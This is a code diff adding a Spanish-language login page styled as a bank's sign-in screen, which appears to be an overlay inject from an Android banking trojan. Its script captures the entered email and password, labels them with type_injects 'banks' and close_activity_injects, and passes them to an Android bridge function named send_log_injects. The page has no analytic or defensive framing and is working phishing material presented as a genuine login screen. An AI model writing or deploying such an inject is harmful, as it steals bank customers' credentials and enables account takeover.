@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <style>
+        header {
+            padding: 30px 0 0 0;
+            text-align: center;
+        }
+
+        section {
+            padding: 15px;
+        }
+
+        h2 {
+            text-align: center;
+        }
+
+        header > p {
+            text-align: center;
+            font-weight: 200;
+            color: #000;
+        }
+
+        .input{
+            width: 100%;
+            border: 0;
+            border-bottom:1px solid #cccccc;
+            margin-bottom: 15px;
+            padding-left: 0;
+            color: #212121;
+        }
+
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 15px 10px 2px 0;
+            position: relative;
+            z-index: 2;
+            font-size: 1em;
+        }
+        .cool-input__input:focus {
+            outline: none;
+        }
+
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: 100%;
+            position: absolute;
+            left: 0;
+            top: 40%;
+            font-size: 14px;
+            line-height: 0;
+            color: #aaaaaa;
+            transition: all 0.2s ease;
+            font-weight: 200;
+        }
+
+        .cool-input__input_filled + .cool-input__placeholder,
+        .cool-input__input:focus + .cool-input__placeholder {    font-size: 0.6em;
+            top: 0;
+            margin-top: 1em;
+            left: 0;
+        }
+
+        input,button{
+            outline: none;
+            box-shadow: none;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+        p {
+            text-align: center;
+            color: #3478f6;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            color: #fff;
+            background-color: #2865a8;
+            border: 1px solid #2865a8;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+
+        h5 {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        div.button {
+            color: #2865a8;
+            background-color: transparent;
+            text-align: center;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 140px;margin-bottom: 20px;" src="data:image/png;base64,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" alt="">
+            <h2> ¡Hola! </h2>
+            <p> Inicia sesión con tu correo electrónico </p>
+        </header>
+        <section>
+
+            <div class="cool-input">
+                <input type="tel" id="login" name="login" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder">Correo electrónico*</span>
+            </div>
+
+            <div class="cool-input">
+                <input type="password" id="password" name="password" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder">Contraseña*</span>
+            </div>
+
+            <p> ¿Olvidaste tu contraseña? </p>
+
+            <input type="submit" class="button" id="sendData" value="INICIAR SESION">
+
+            <h5> ¿No tienes cuenta? </h5>
+
+            <div class="button">
+                CREA TU CUENTA
+            </div>
+        </section>
+        <footer>
+
+        </footer>
+    </form>
+    <script>
+        $('.cool-input__input').on('input', function(){
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var sendData = document.getElementById('sendData');
+
+        function emailValidation() {
+            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
+                login.classList.add('error');
+                return false;
+            } else {
+                login.classList.remove('error');
+                return true;
+            }
+        }
+
+        login.onkeyup = () => {
+            emailValidation()
+        }
+
+        sendData.onclick = () => {
+            emailValidation()
+
+            if(password.value.length < 6) {
+                password.classList.add('error');
+            } else {
+                password.classList.remove('error');
+            }
+
+            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length >= 6) {
+                var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+            }
+        }
+    </script>
+</body>
+</html>
